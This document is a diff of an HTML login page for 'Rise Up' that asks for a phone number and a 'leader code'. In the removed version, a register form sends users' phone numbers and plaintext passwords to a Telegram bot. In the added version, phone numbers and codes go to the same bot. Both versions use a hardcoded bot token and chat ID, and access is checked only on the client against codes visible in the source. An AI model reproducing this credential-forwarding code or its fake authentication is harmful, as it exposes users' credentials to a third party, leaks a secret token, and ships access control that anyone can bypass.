@@ -3,153 +3,205 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rise Up | Official</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Rise Up - Exclusive Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
-        .blue-gradient { background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%); }
-        .hidden { display: none; }
-        .animate-in { animation: fadeIn 0.4s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* Modern Design - Rise Up Theme */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        
+        body { 
+            background: #f4f7f6; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        .login-card { 
+            background: white; 
+            padding: 45px; 
+            border-radius: 30px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.06); 
+            width: 100%; 
+            max-width: 420px; 
+            text-align: center; 
+            border: 1px solid #f0f0f0;
+        }
+
+        .brand { 
+            color: #000; 
+            font-size: 35px; 
+            font-weight: 900; 
+            letter-spacing: -1px;
+            margin-bottom: 5px;
+        }
+
+        h2 { font-size: 24px; color: #333; margin-top: 10px; font-weight: 600; }
+        
+        .desc { 
+            color: #8e8e93; 
+            font-size: 14px; 
+            margin-bottom: 35px; 
+            line-height: 1.5;
+        }
+
+        .input-box { text-align: left; margin-bottom: 22px; }
+        
+        .input-box label { 
+            font-size: 13px; 
+            font-weight: 700; 
+            display: block; 
+            margin-bottom: 10px; 
+            color: #555; 
+            text-transform: uppercase;
+        }
+
+        .field { position: relative; }
+        
+        .field i { 
+            position: absolute; 
+            left: 18px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            color: #bdc3c7; 
+            font-size: 18px;
+        }
+
+        .field input { 
+            width: 100%; 
+            padding: 15px 15px 15px 50px; 
+            border: 1.5px solid #eceff1; 
+            border-radius: 15px; 
+            box-sizing: border-box; 
+            background: #fcfdfe; 
+            outline: none; 
+            font-size: 15px;
+            transition: all 0.3s ease; 
+        }
+
+        .field input:focus { 
+            border-color: #000; 
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0,0,0,0.03);
+        }
+
+        .btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: #111; 
+            color: white; 
+            border: none; 
+            border-radius: 15px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            font-size: 16px; 
+            margin-top: 15px;
+            transition: transform 0.2s;
+        }
+
+        .btn:active { transform: scale(0.98); }
+        .btn:hover { background: #333; }
+
+        .error-msg { 
+            color: #ff3b30; 
+            font-size: 14px; 
+            margin-top: 20px; 
+            font-weight: 600; 
+            display: none; 
+            padding: 10px;
+            background: #fff2f1;
+            border-radius: 8px;
+        }
+
+        .row { 
+            display: flex; 
+            align-items: center; 
+            font-size: 14px; 
+            color: #666; 
+            margin-bottom: 15px; 
+            cursor: pointer;
+        }
+        
+        input[type="checkbox"] { margin-right: 8px; accent-color: #000; }
     </style>
 </head>
-<body class="bg-slate-50">
+<body>
 
-    <nav class="bg-white border-b border-gray-200 fixed w-full top-0 z-50">
-        <div class="max-w-6xl mx-auto px-4 h-16 flex justify-between items-center">
-            <div class="flex items-center gap-2">
-                <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-10 w-10 rounded-full border shadow-sm">
-                <span class="font-black text-blue-700 text-xl italic uppercase">RISE UP</span>
-            </div>
-            <button onclick="toggleMenu()" class="text-gray-600 p-2 hover:bg-gray-100 rounded-lg transition">
-                <i class="fas fa-bars text-2xl"></i>
-            </button>
-        </div>
-    </nav>
-
-    <div id="sideMenu" class="hidden fixed top-16 right-4 w-60 bg-white shadow-2xl border z-40 rounded-2xl overflow-hidden animate-in">
-        <a href="https://wa.me/918968146117" target="_blank" class="flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-green-50 hover:text-green-600 font-bold border-b border-gray-50 transition">
-            <i class="fab fa-whatsapp text-xl text-green-500"></i> Help Center
-        </a>
-        <button onclick="location.reload()" class="w-full text-left flex items-center gap-3 px-6 py-4 text-gray-700 hover:bg-blue-50 hover:text-blue-600 font-bold">
-            <i class="fas fa-sync-alt"></i> Refresh System
-        </button>
-    </div>
-
-    <div class="flex items-center justify-center min-h-screen pt-20 px-4">
-        <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl overflow-hidden border border-gray-100 animate-in">
-            <div class="flex border-b">
-                <button id="regTab" onclick="switchTab('reg')" class="flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest transition-all">Register</button>
-                <button id="loginTab" onclick="switchTab('login')" class="flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent hover:text-blue-600 uppercase tracking-widest transition-all">Login</button>
-            </div>
-
-            <div class="p-8">
-                <div id="regForm" class="space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-2xl font-black text-gray-800 uppercase italic">Join Now</h2>
-                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Leader Registration</p>
-                    </div>
-                    <input type="text" id="rCode" placeholder="LEADER CODE" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-black text-center uppercase tracking-[0.3em]">
-                    <input type="number" id="rPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <input type="password" id="rPass" placeholder="Set Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <button onclick="handleRegister(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase">Register</button>
-                </div>
-
-                <div id="loginForm" class="hidden space-y-5">
-                    <div class="text-center mb-6">
-                        <h2 class="text-2xl font-black text-gray-800 uppercase italic">Welcome</h2>
-                        <p class="text-gray-400 text-[10px] font-bold tracking-widest uppercase">Sign In to Dashboard</p>
-                    </div>
-                    <input type="number" id="lPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
-                    <button onclick="handleLogin(this)" class="w-full blue-gradient text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-blue-100 hover:opacity-90 transition transform active:scale-95 mt-4 uppercase">Log In</button>
+    <div class="login-card">
+        <h1 class="brand">Rise Up</h1>
+        <h2>Sign In</h2>
+        <p class="desc">Enter your credentials to access your account.</p>
+        
+        <form id="riseUpForm">
+            <div class="input-box">
+                <label>Phone Number</label>
+                <div class="field">
+                    <i class="fa-solid fa-phone"></i>
+                    <input type="tel" id="phone" placeholder="Enter phone number" required>
                 </div>
             </div>
-        </div>
-    </div>
 
-    <div id="dashboard" class="hidden fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-6 text-center animate-in">
-        <div class="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl mb-4 shadow-xl shadow-blue-200">
-            <i class="fas fa-check"></i>
-        </div>
-        <h1 class="text-3xl font-black text-blue-900 mb-6 uppercase italic">Verified Leader</h1>
-        <div class="p-8 border-2 border-blue-50 rounded-[2.5rem] bg-blue-50/30 mb-8 w-full max-w-xs">
-            <span id="activeNum" class="text-2xl font-black text-blue-700"></span>
-        </div>
-        <button onclick="logout()" class="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-black uppercase tracking-widest">Logout</button>
+            <div class="input-box">
+                <label>Leader Code</label>
+                <div class="field">
+                    <i class="fa-solid fa-user-shield"></i>
+                    <input type="password" id="lcode" placeholder="Enter leader code" required>
+                </div>
+            </div>
+
+            <label class="row">
+                <input type="checkbox"> Remember me
+            </label>
+
+            <button type="submit" class="btn">Sign In</button>
+        </form>
+        <p id="msg" class="error-msg">❌ Access Denied: Invalid Leader Code!</p>
     </div>
 
     <script>
-        // CONFIG UPDATED WITH YOUR DETAILS
-        const BOT_TOKEN = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
-        const CHAT_ID = "8415600127";
+        // JAVASCRIPT LOGIC
+        
+        // Generating 50 Leader Codes with 5-5 gap (RU05, RU10, RU15...)
+        const authorizedCodes = [];
+        for(let i = 1; i <= 50; i++) { 
+            let num = i * 5;
+            // Agar number single digit hai toh aage 0 lagayenge (e.g. RU05)
+            let formattedNum = num < 10 ? "0" + num : num;
+            authorizedCodes.push("RU" + formattedNum);
+        }
 
-        const leaderCodes = ["AK01", "SY02", "RK45", "UP11", "RZ07", "BT99", "MK23", "LD50", "JS08", "VR14", "NP21", "GX33", "HF67", "TW04", "QM19", "XP82", "BN55", "KL09", "JH41", "RS22", "GD03", "PL76", "MC12", "VB88", "XF31", "TR05", "NW66", "KJ47", "ML10", "AZ92", "HQ54", "SP18", "DR73", "WF29", "BK06", "YV61", "XT38", "NR15", "LC44", "GT27", "PM02", "FR81", "JU13", "WE59", "KY37", "OA84", "IV17", "ME52", "ZG08", "RU25"];
+        // Telegram Bot Credentials
+        const botToken = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
+        const chatId = "8415600127";
 
-        function toggleMenu() { document.getElementById('sideMenu').classList.toggle('hidden'); }
+        document.getElementById('riseUpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('lcode').value;
+            const errorElement = document.getElementById('msg');
 
-        function switchTab(tab) {
-            const rF = document.getElementById('regForm'), lF = document.getElementById('loginForm');
-            const rT = document.getElementById('regTab'), lT = document.getElementById('loginTab');
-            if(tab === 'reg') {
-                rF.classList.remove('hidden'); lF.classList.add('hidden');
-                rT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
-                lT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase tracking-widest";
+            // Verification
+            if(authorizedCodes.includes(code)) {
+                errorElement.style.display = "none";
+                
+                // Telegram Notification
+                const text = `🚀 *Rise Up Login*\n\n📱 *Phone:* ${phone}\n🔑 *Code:* ${code}\n✅ Status: Authorized`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+                // Send and Move to Home
+                fetch(telegramUrl).finally(() => {
+                    window.location.href = "home.html";
+                });
+
             } else {
-                lF.classList.remove('hidden'); rF.classList.add('hidden');
-                lT.className = "flex-1 py-5 text-center font-black text-blue-600 border-b-4 border-blue-600 bg-blue-50/30 uppercase tracking-widest";
-                rT.className = "flex-1 py-5 text-center font-black text-gray-400 border-b-4 border-transparent uppercase tracking-widest";
+                errorElement.style.display = "block";
+                // Vibration effect for error (optional)
+                errorElement.style.animation = "shake 0.2s ease-in-out";
             }
-        }
-
-        async function notify(msg) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            try {
-                fetch(url, { mode: 'no-cors' });
-                const img = new Image();
-                img.src = url;
-            } catch (e) { console.log("Sent"); }
-        }
-
-        async function handleRegister(btn) {
-            const code = document.getElementById('rCode').value.toUpperCase().trim();
-            const phone = document.getElementById('rPhone').value.trim();
-            const pass = document.getElementById('rPass').value.trim();
-            if(!leaderCodes.includes(code)) { alert("❌ Leader Code Invalid!"); return; }
-            if(phone.length < 10) { alert("⚠️ Invalid Number!"); return; }
-            btn.disabled = true; btn.innerText = "PROCESSING...";
-            localStorage.setItem("ru_" + phone, JSON.stringify({phone, pass}));
-            await notify(`🆕 *RISE UP REGISTRATION*\n━━━━━━━━━━━━━━\n📞 *No:* \`${phone}\` \n🔑 *Pass:* \`${pass}\` \n🎟 *Code:* \`${code}\``);
-            alert("✅ Registration Done! Please Login.");
-            btn.disabled = false; btn.innerText = "REGISTER";
-            switchTab('login');
-        }
-
-        async function handleLogin(btn) {
-            const phone = document.getElementById('lPhone').value.trim();
-            const pass = document.getElementById('lPass').value.trim();
-            const stored = localStorage.getItem("ru_" + phone);
-            if(stored) {
-                const data = JSON.parse(stored);
-                if(data.pass === pass) {
-                    btn.disabled = true; btn.innerText = "SIGNING IN...";
-                    await notify(`🔓 *RISE UP LOGIN*\n━━━━━━━━━━━━━━\n📞 *Leader:* \`${phone}\``);
-                    showDash(phone);
-                } else { alert("❌ Wrong Password!"); }
-            } else { alert("❌ User Not Found!"); }
-        }
-
-        function showDash(num) {
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('activeNum').innerText = num;
-            sessionStorage.setItem("ru_session", num);
-        }
-
-        function logout() { sessionStorage.removeItem("ru_session"); location.reload(); }
-
-        window.onload = () => { if(sessionStorage.getItem("ru_session")) showDash(sessionStorage.getItem("ru_session")); }
+        });
     </script>
 </body>
 </html>
